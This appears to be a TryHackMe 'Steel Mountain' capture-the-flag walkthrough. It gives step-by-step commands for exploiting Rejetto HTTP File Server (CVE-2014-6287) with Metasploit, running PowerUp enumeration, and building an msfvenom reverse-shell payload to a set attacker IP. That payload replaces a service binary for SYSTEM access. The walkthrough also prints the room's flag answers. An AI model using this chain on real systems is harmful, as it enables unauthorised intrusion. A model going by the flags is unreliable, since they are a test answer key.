Room: https://tryhackme.com/room/steelmountain

Title: Steel Mountain

Target IP: 10.10.144.146

1. Who is the employee of the month?
   - Navigate to the website at your target IP address
   - Inspect the source code of the website

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/900ffa36-6186-4ce1-a577-6e327bb1acdc)

   - Doing an "Inspect" on the website lets us see the name of the image
   - Alternatively, we could have saved the image and performed a reverse lookup

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/9d8ba84c-af0a-4e20-86dc-fad56e8718b0)

   - Answer: **Bill Harper**

2. Scan the machine with nmap. What is the other port running a web server on?
   - ```nmap -sC -sV 10.10.144.146```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/0cceda4f-317c-412f-bcff-1aa16a67cf0d)

3. Take a look at the other web server. What file server is running?
   - Navigate to ```Target IP:8080```
   - Click on HTTPFileServer 2.3
   - We find our answer!!

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/0c6fd3c2-0332-437c-aaad-df1410dd1f03)

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/b3eb4295-d9d8-4316-ad65-1fde1729bc06)

   - Answer: **Rejetto HTTP File Server**

4. What is the CVE number to exploit this file server?
   - A simple google search does the trick!

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/a7067f7b-8265-49b3-a4fb-f63eca04d811)

   - Answer: **2014-6287**

5. Use Metasploit to get an initial shell. What is the user flag?
   - Metasploit is a built in pen-testing tool that comes with Kali Linux and uses known vulnerabilities to gain shells
   - Load it up by typing ```msfconsole```
   - Seach for the exploit we found earlier ```search CVE-2014-6287```
   - Set our exploit ```use 0```
   - Change RPORT number (target port) to 8080 ```set RPORT 8080```
   - Change RHOSTS (the machine we want to attack) to our target IP
     ```set RHOSTS [Target IP]```
   - Change LHOSTS to our VPN (or local machine IP) ```set LHOSTS tun0```
   - Run the exploit using ```run``` or ```exploit```
   - We have gained our meterpreter shell!!!

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/3d1d516d-91d9-488f-bd2a-e584644b011e)

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/0ff7e237-0582-44af-bec5-8de6115a573a)

   - Navigate to the `C:\Users\bill\Desktop` directory
   - Cat out the flag!
     
![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/46a5f56b-1d87-4e02-9569-ad2b23b0e73a)

   - Answer: **��b04763b6fcf51fcd7c13abc7db4fd365**

6. Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
   - Download the PowerUp script to enumerate the machine: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
   - Copy and paste the raw script in your VM as ```PowerUp.ps1```
   - Upload script in Meterpreter ```upload [directory path]/PowerUp.ps1
   - Load powershell ```load powershell```
   - Enter powershell ```powershell_shell```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/830d502e-4388-49bc-bda2-2b49ea75c650)

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/2ab346ff-23b1-4aac-b4ef-b880a8a8660b)

   - Enter commands ```. . \PowerUp.ps1```
   - Run ```Invoke-AllChecks```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/341a028c-a12b-4538-afb3-6a9c6943ccfa)

   - Answer: **AdvancedSystemCareService9**

7. What is the root flag?
   - Modify the given msfvenom code to your machine IP ```msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe```
   - ```-p``` is payload
   - ```-e``` is the executable encoded
   - ```f``` refers to file type
   - ```-o``` being outputted, change Advanced.exe to ASCService.exe (not required but easier when uploading so don't have to rename)
   - ```msfvenom -p windows/shell_reverse_tcp LHOST=10.2.104.89 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/4688485f-fb91-4072-afe5-662bc1226bbe)

   - Go back to meterpreter and upload the ASCService.exe executable ```upload [directory path]/ASCService.exe```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/549cc542-2619-427b-b124-d2fde0c1c932)

   - Set up a netcat listner on your machine
     
![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/ebd0b2ac-434d-40a3-ae17-89650ea4d3c7)

   - Go back to meterpreter shell and stop the AdvancedSystemCareService9 service so we can edit it...
   - ```shell```
   - ```sc stop AdvancedSystemCareService9```
   - ```exit```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/c61b2fa3-6b13-4103-8ef0-ce6e2741ea75)

   - Copy the path the service is in

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/b031c092-6616-44ce-8952-a417f2d2d0d2)

   - ```cp ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"```
   - Replacing the service with a msfvenom payload

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/44f967b4-392b-4887-8e3c-2d570f355790)

   - Go back to shell and start the service so the payload will execute
   - ```shell```
   - ```sc start AdvancedSystemCareService9```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/26439377-80ed-449e-8033-d25bb4953576)

   - Go back to netcat listener, we have our shell!!!

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/b7bfa4df-5d50-4ec1-802c-d62977b23b91)

   - Find the root flag...
   - Navigate to ```C:\Users\Administrator\Desktop```
   - use ```dir``` instead of ```ls```
   - use ```type``` insetad of ```cat```

![image](https://github.com/Kiezroy/TryHackMe/assets/67439231/8e5d7710-e53a-432e-92a6-490f9bfc6317)

   - Answer: **9af5f314f57607c00fd09803a587db80**


